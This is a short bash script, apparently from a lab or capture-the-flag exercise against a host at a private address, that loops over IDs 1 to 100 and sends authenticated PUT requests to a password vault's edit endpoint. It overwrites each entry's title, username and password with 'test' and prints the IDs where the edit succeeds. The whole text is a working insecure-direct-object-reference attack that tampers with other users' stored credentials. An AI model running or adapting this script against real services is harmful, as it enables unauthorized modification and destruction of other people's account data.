for id in {1..100}; do
  echo "Testing ID: $id"
  curl -s -X PUT http://10.0.0.10/vault/edit/$id \
    -H "Cookie: connect.sid=s%3AoJ5g5Gk6fvmfemhAviLKS-521lOrK8af.ln45ExmnMcmhS0AznQaRhb7lxiyxxpcQD%2B78Nsrsy%2FI" \                     
    -H "Content-Type: application/json" \
    -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' | grep -q '"success":true' && echo "Valid ID: $id"
done
